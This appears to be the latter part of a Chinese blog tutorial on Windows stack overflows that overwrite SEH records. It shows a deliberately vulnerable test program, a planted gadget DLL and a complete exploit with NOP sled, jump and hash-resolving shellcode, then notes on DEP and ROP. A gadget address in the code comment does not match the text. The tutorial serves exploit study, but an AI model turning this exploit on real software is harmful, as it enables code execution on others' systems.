    #include "stdafx.h"
    void Vuln()
    {
    //存放可利用的gadgets
    __asm{
    pop ecx
    pop ebx
    ret
    }
    }
    生成Test.dll
    漏洞程序代码
    注意要把Test.dll放到和该程序的同一个目录下
    #include "stdafx.h"
    #include
    #include
    char shellcode[]=””;
    int MyExceptionhandler()
    {
    printf("got an exception ,press Enter to kill the process!n");
    getchar();
    ExitProcess(1);
    return 0;
    }
    void SEH_test()
    {
    char buf[200];
    int zero=0;
    //__asm int 0x3;
    __try{
    printf("In the SEH_test!n");
    strcpy(buf,shellcode);
    zero=4/zero;
    }
    __except(MyExceptionhandler()){};
    }
    int main(int argc, char* argv[])
    {
    LoadLibrary(_T("Test.dll")); //手动加载DLL
    SEH_test();
    return 0;
    }
寻找gadget
通过!py mona module/或者OD的SafeSEH/OllyFindAddr插件分析发现 Test.dll没有开启SafeSEH
搜索Gadget
!py mona.py findwild -s pop reg32# pop reg32 # ret -m “Test.dll”
我们在Test.dll模块中我们埋藏了可用gadget
所以很容易地找到符合的地址为0x6DAB13CE
同时通过!py mona.py mod 发现Test.dll模块没有开启SafeSEH
接下来就和上一节的内容类似了，使用POP POP RET结合JMP SHORT 跳转进入shellcode。
程序实例：
    #include "stdafx.h"
    #include
    #include
    char shellcode[]=
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90"
    "xEBx06x90x90"  // Point to Next SEH record
    "xCEx13xAEx6D" //SE handler 0x6DAE13CE
    //"x70xfex12x00"//SE handler
    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
    "x53xFFx57xFCx53xFFx57xF8";
    int MyExceptionhandler()
    {
    printf("got an exception ,press Enter to kill the process!n");
    getchar();
    ExitProcess(1);
    return 0;
    }
    void SEH_test()
    {
    char buf[200];
    int zero=0;
    //__asm int 0x3;
    __try{
    printf("In the SEH_test!n");
    strcpy(buf,shellcode);
    zero=4/zero;
    }
    __except(MyExceptionhandler()){};
    }
    int main(int argc, char* argv[])
    {
    LoadLibrary(_T("Test.dll"));
    SEH_test();
    return 0;
    }
如果程序本身的DEP是关闭的，那么效果应该和我这里是一样的。
当然，如果地址是在调试模式下确定的，那么也只有debug时候才能成功利用，主要原因是调试状态和实际状态的内存机制可能存在差异。解决方案就是使用getchar()/int
0x3中断(建议前者，因为每次编译DLL的载入基地址可能都会变化，即使没有开启ASLR)，然后再Attach来调试。
**2.4.3扩展思路：结合ROP绕过DEP和SafeSEH的个人理解**
开启DEP
硬件 DEP 利用了在 DEP 兼容的 CPU 的 NX(“无执行页保护”，AMD 规格)或者 XD(“不 能执行”，intel
规格)位，并且将特定部分的内存(只能包含数据，比如说默认堆，栈，内 存池)标记为不可执行。
当尝试在一个 DEP 保护的数据页执行代码时，将会发生访问拒绝
(STATUS_ACCESS_VIOLATIO(N 0xc0000005))
也就是说我们放在栈帧中的shellcode将不会被成功执行
获取WinExec的函数的地址，可以算出WinExec相对kernel32的偏移地址为0x8BE0D
在没有开启ASLR的时候，是可以直接跳转的。只需要先在栈中放好参数即可。
但是通过覆盖SEH是无法直接跳转到WinExec函数的，因为Kernel32也开了SafeSEH，加上DEP的开启，导致我们POP POP
RET方案也失效了。不过我们依旧可以通过未开启SafeSEH/DEP的模块实现绕过。
但目前通用的方案就是DEP绕过方案。但是在开启SafeSEH之后，通过SEH覆盖的即使使用ROP绕过难度比较大。这部分在之后的学习中会进一步探讨。
## 总结
S.E.H结构的覆盖是Win下的一个特色，学习这部分知识非常有意思，因为在Linux下的溢出中从来没有接触过，听周围做PWN的朋友说最近也是出了不少Win下的PWN，很多都和S.E.H机制有所关联。
最后感谢二进制安全的前辈们给我的指引，作者水平有限，如有错误欢迎评论区指正。
## 参考文献
[1]wwzzww.windows-SEH详解[DB/OL].
, 2019-2-22
[2] [冷月宫主](https://me.csdn.net/e_wsq).Win32结构化异常处理(SEH)——异常处理程序( **try/**
except)[DB/OL]
 ,2013-11-28
[3][护花使者cxy](https://me.csdn.net/qq_38924942).Windows XP sp3 系统安装 Windbg 符号文件
Symbols 时微软失去支持的解决方案[DB/OL].
[4][tang3](http://blog.nsfocus.net/author/tang3/),看教程学溢出之SEH利用[DB/OL].
[5] [chen_sunn](https://me.csdn.net/chen_sunn),开始写Immunity Debugger
PyCommand.[DB/OL].
[6] [BugMeOut](https://me.csdn.net/wang471003247).为windbg安装mona.py[DB/OL].
[7]王清.0Day安全:软件漏洞分析技术[M].第二版.电子工业出版社,2011
[8]看雪翻译.Exploit编写教程[PDF],2010
[9] [Umiade](https://me.csdn.net/qq_19550513).SafeSEH原理及绕过技术浅析[DB/OL].
[10] [swartz_lubel](https://me.csdn.net/swartz_lubel),栈溢出笔记1.10
基于SEH的栈溢出[DB/OL].
[11][zhou191954](https://me.csdn.net/zhou191954)./SafeSEH编译选项 :
原理及绕过技术浅析[DB/OL]
.
[12] [woijal520](https://me.csdn.net/woijal520).Win32 SEH 详解[DB/OL].
[13][Yx0051](https://me.csdn.net/Yx0051).利用未启用SafeSEH模块绕过SafeSEH[DB/OL].